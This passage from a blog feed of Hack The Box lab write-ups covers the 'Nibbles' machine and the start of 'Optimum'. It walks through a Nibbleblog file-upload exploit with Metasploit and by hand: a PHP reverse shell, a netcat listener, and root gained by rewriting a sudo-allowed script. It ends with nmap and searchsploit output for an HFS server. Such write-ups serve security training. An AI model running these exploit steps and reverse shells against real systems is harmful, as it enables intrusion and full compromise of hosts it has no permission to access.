</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username admin
<span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; admin
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.75
<span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.75
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> targeturi /nibbleblog
<span style="color:#8be9fd;font-style:italic">targeturi</span> <span style="color:#ff79c6">=</span>&gt; /nibbleblog
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> password nibbles
<span style="color:#8be9fd;font-style:italic">password</span> <span style="color:#ff79c6">=</span>&gt; nibbles
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; run

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:46832<span style="color:#ff79c6">)</span> at 2020-09-19 06:26:29 +0000
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted image.php
meterpreter &gt; getuid
Server username: nibbler <span style="color:#ff79c6">(</span>1001<span style="color:#ff79c6">)</span>
meterpreter &gt; cat user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation">privilege escalation</h1>
<p>We can find a personal script in a zip file &hellip; maybe it run as root with sudo?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /tmp
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; sessions <span style="color:#bd93f9">1</span>
meterpreter &gt; download personal.zip
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloading: personal.zip -&gt; personal.zip
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Downloaded 1.81 KiB of 1.81 KiB <span style="color:#ff79c6">(</span>100.0%<span style="color:#ff79c6">)</span>: personal.zip -&gt; personal.zip
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> download   : personal.zip -&gt; personal.zip
meterpreter &gt; <span style="color:#8be9fd;font-style:italic">bg</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Backgrounding session 1...
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/nibbleblog_file_upload<span style="color:#ff79c6">)</span> &gt; unzip personal.zip
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> exec: unzip personal.zip

Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh

meterpreter &gt; shell
Process <span style="color:#bd93f9">1360</span> created.
Channel <span style="color:#bd93f9">0</span> created.
id
</code></pre></td></tr></table>
</div>
</div><p>We have failed to get a shell from meterpreter :( so we try a non-metasploit exploit</p>
<h1 id="without-metasploit">Without Metasploit</h1>
<p>The related <a href="https://www.cvedetails.com/cve/CVE-2015-6967/">CVE-2015-6967</a> link to this <a href="https://dl.packetstormsecurity.net/1509-exploits/nibbleblog403-exec.txt">blog that describes the attack</a></p>
<ol>
<li>
<p>Obtain Admin credentials (we already have them: <code>admin:nibbles</code>)</p>
</li>
<li>
<p>Activate My image plugin by visiting</p>
<pre><code>http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=install&amp;plugin=my_image
</code></pre>
</li>
<li>
<p>Upload PHP shell, ignore warnings</p>
</li>
<li>
<p>Visit http://localhost/nibbleblog/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin.</p>
</li>
</ol>
<p>get a reverse_php_shell at pentest monkey and change the IP:PORT</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -Os https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
ctf@014202efa8c8:~/htb/nibbles$ vi php-reverse-shell.php
</code></pre></td></tr></table>
</div>
</div><p>We get a shell that we can upgrade with python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

ctf@014202efa8c8:~$ rlwrap nc -lnvp <span style="color:#bd93f9">9000</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">56658</span>
Linux Nibbles 4.4.0-104-generic <span style="color:#6272a4">#127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
 04:18:28 up <span style="color:#bd93f9">55</span> min,  <span style="color:#bd93f9">0</span> users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>nibbler<span style="color:#ff79c6">)</span>
/bin/sh: 0: can<span style="color:#f1fa8c">&#39;t access tty; job control turned off
</span><span style="color:#f1fa8c">$ python -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#39;
</span><span style="color:#f1fa8c">/bin/sh: 1: python: not found
</span><span style="color:#f1fa8c">$ python3 -c &#39;</span>import pty; pty.spawn<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">)</span>&#39;
nibbler@Nibbles:/$
</code></pre></td></tr></table>
</div>
</div><p>We have sudo privilege for a script in our HOME directorys</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nibbler@Nibbles:/$ sudo -l
sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries <span style="color:#ff79c6">for</span> nibbler on Nibbles:
    env_reset, mail_badpass,
    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User nibbler may run the following commands on Nibbles:
    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/$ ls /home/nibbler/personal/stuff/monitor.sh
ls /home/nibbler/personal/stuff/monitor.sh
ls: cannot access <span style="color:#f1fa8c">&#39;/home/nibbler/personal/stuff/monitor.sh&#39;</span>: No such file or directory
nibbler@Nibbles:/$
</code></pre></td></tr></table>
</div>
</div><p>The file does not exists but we have permissions to create it</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nibbler@Nibbles:/$ <span style="color:#8be9fd;font-style:italic">echo</span> -e <span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
&lt;<span style="color:#f1fa8c">&#39;#!/bin/sh\n/bin/sh&#39;</span> &gt;  /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
id
id
<span style="color:#8be9fd;font-style:italic">pwd</span>
<span style="color:#8be9fd;font-style:italic">pwd</span>
sudo: unable to resolve host Nibbles: Connection timed out
<span style="color:#6272a4"># uid=0(root) gid=0(root) groups=0(root)</span>
<span style="color:#6272a4"># /</span>
<span style="color:#6272a4"># cat /root/root.txt</span>
cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Optimum</title><link>https://0xade1.github.io/posts/2020/09/htb-optimum/</link><pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-optimum/</guid><description>Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 ctf@014202efa8c8:~/htb/optimus$ nmap -sC -sV -oA nmap/optimus -p80 10.10.10.8 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 23:06 HKT Nmap scan report for 10.10.10.8 Host is up (0.066s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.</description><content type="html"><![CDATA[<h1 id="nmap">Nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/optimus$ nmap -sC -sV -oA nmap/optimus -p80 10.10.10.8
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-18 23:06 HKT
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.8
Host is up <span style="color:#ff79c6">(</span>0.066s latency<span style="color:#ff79c6">)</span>.

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 11.57 seconds
</code></pre></td></tr></table>
</div>
</div><h1 id="searchsploit">Searchsploit</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb$ searchsploit HFS
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service         | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem <span style="color:#ff79c6">(</span>Denial of Service<span style="color:#ff79c6">)</span>                   | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure               | osx/local/35488.c
Apple Mac OSX xnu 1228.x - <span style="color:#f1fa8c">&#39;hfs-fcntl&#39;</span> Kernel Privilege Escalation        | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                | windows/remote/37985.py
HFS Http File Server 2.3m Build <span style="color:#bd93f9">300</span> - Buffer Overflow <span style="color:#ff79c6">(</span>PoC<span style="color:#ff79c6">)</span>               | multiple/remote/48569.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service               | linux/dos/28895.txt
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> - Remote Command Execution <span style="color:#ff79c6">(</span>Metasploit<span style="color:#ff79c6">)</span>    | windows/remote/34926.rb
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> 1.5/2.x - Multiple Vulnerabilities         | windows/remote/31056.py
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> 2.2/2.3 - Arbitrary File Upload            | multiple/remote/30850.txt
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> 2.3.x - Remote Command Execution <span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">)</span>       | windows/remote/34668.txt
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> 2.3.x - Remote Command Execution <span style="color:#ff79c6">(</span>2<span style="color:#ff79c6">)</span>       | windows/remote/39161.py
Rejetto HTTP File Server <span style="color:#ff79c6">(</span>HFS<span style="color:#ff79c6">)</span> 2.3a/2.3b/2.3c - Remote Command Execution  | windows/webapps/34852.txt
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></td></tr></table>
</div>
</div><h1 id="metasploit">Metasploit</h1>
<h2 id="user-flag">user flag</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
